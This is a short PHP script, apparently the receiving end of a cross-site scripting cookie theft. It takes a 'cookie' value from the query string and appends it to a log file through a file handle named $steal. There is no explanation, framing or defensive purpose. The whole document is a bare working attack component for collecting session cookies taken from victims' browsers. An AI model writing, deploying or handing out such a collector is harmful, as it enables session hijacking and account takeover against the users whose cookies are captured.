<?php
       $cookie = $HTTP_GET_VARS["cookie"];
$steal = fopen("logs.txt", "a");
fwrite($steal, $cookie ."\\n");
fclose($steal);
?>